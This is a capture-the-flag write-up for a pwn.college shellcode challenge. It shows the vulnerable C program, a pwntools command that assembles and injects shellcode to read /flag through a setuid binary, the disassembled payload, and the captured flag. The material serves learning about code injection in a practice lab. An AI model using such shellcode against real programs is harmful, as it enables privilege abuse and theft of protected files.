## Challenge

Write and execute shellcode to read the flag!

## Solution

I started by examining the source code

```bash
hacker@binary-exploitation~basic-shellcode:~$ cd /challenge
hacker@binary-exploitation~basic-shellcode:/challenge$ ls -la
total 36
drwxr-xr-x 1 root root  4096 Oct 21 13:45 .
drwxr-xr-x 1 root root  4096 Oct 21 13:45 ..
-rwsr-xr-x 1 root root    46 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 17520 Jan 27  2025 binary-exploitation-basic-shellcode
-rwsr-xr-x 1 root root  3916 Jan 27  2025 binary-exploitation-basic-shellcode.c
hacker@binary-exploitation~basic-shellcode:/challenge$ cat binary-exploitation-basic-shellcode.c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

void *shellcode;
size_t shellcode_size;

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    puts("This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
    puts("as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
    puts("practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
    puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
    for (int i = 3; i < 10000; i++) close(i);
    for (char **a = argv; *a != NULL; a++) memset(*a, 0, strlen(*a));
    for (char **a = envp; *a != NULL; a++) memset(*a, 0, strlen(*a));

    puts("In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every");
    puts("execution, your shellcode will need to be *position-independent*.\n");
    uint8_t shellcode_buffer[0x1000];
    shellcode = (void *)&shellcode_buffer;
    printf("Allocated 0x1000 bytes for shellcode on the stack at %p!\n", shellcode);

    puts("Reading 0x1000 bytes from stdin.\n");
    shellcode_size = read(0, shellcode, 0x1000);
    assert(shellcode_size > 0);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");
    ((void(*)())shellcode)();

    printf("### Goodbye!\n");
}
```

Shellcode is machine code that we inject into a vulnerable program to make it do what we want. In this case, we want to read and display the flag from `/flag`

Since the program
- Closes all file descriptors > 2
- Clears all environment variables and arguments
- Executes our code on the stack

The shellcode should
- Open the file `/flag`
- Read its contents
- Write those contents to stdout (file descriptor 1)

```bash
hacker@binary-exploitation~basic-shellcode:/challenge$python3 - <<'PY' | ./binary-exploitation-basic-shellcodee
from pwn import *
context.arch='amd64'
sc = asm(shellcraft.amd64.linux.cat('/flag'))
import sys
sys.stdout.buffer.write(sc)
PY
###
### Welcome to ./binary-exploitation-basic-shellcode!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffdcedabff0!
Reading 0x1000 bytes from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffdcedabff0 | 48 b8 01 01 01 01 01 01 01 01                 | movabs rax, 0x101010101010101
0x00007ffdcedabffa | 50                                            | push rax
0x00007ffdcedabffb | 48 b8 2e 67 6d 60 66 01 01 01                 | movabs rax, 0x1010166606d672e
0x00007ffdcedac005 | 48 31 04 24                                   | xor qword ptr [rsp], rax
0x00007ffdcedac009 | 6a 02                                         | push 2
0x00007ffdcedac00b | 58                                            | pop rax
0x00007ffdcedac00c | 48 89 e7                                      | mov rdi, rsp
0x00007ffdcedac00f | 31 f6                                         | xor esi, esi
0x00007ffdcedac011 | 0f 05                                         | syscall 
0x00007ffdcedac013 | 41 ba ff ff ff 7f                             | mov r10d, 0x7fffffff
0x00007ffdcedac019 | 48 89 c6                                      | mov rsi, rax
0x00007ffdcedac01c | 6a 28                                         | push 0x28
0x00007ffdcedac01e | 58                                            | pop rax
0x00007ffdcedac01f | 6a 01                                         | push 1
0x00007ffdcedac021 | 5f                                            | pop rdi
0x00007ffdcedac022 | 99                                            | cdq 
0x00007ffdcedac023 | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{gRiHyG2dgu3f2SMhAY08ApdsDT9.01NxIDLyMjN0czW}
```
